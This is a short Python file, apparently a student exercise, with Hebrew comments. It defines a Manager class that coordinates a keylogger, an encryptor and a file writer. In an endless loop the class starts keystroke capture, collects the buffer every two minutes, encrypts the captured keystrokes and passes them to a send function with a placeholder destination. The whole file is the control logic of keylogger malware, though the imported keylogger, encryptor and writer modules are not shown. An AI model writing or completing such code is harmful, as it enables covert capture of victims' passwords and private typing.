import time
from  file_writer import FileWriter
from  keylogger_service import KeyLogger
from  encryptor import Encryptor



class Manager:
    def __init__(self):
        self.file_writer= FileWriter() # מאתחל את המחלקה הזאת
        self.keylogger_service = KeyLogger() # מאתחל את המחלקה הזאת
        self.encryptor = Encryptor() #מאתחל את המחלקה הזאת

    def data_acquisition(self):
        while True:
            self.keylogger_service.start() #מפעילה את פונקציית האזנה
            time.sleep(120) #ממתין 2 דקות
            data = self.keylogger_service.get_and_clear_buffer()  #מושכת הנתונים שנקלטו עד עכשיו
            new_data = self.encryptor.encrypt_decrypt(data) # מצפין את הדאטא
            self.file_writer.send_data(new_data,"?????") # שולח את הדאטא המוצפן לכתיבה לקובץ




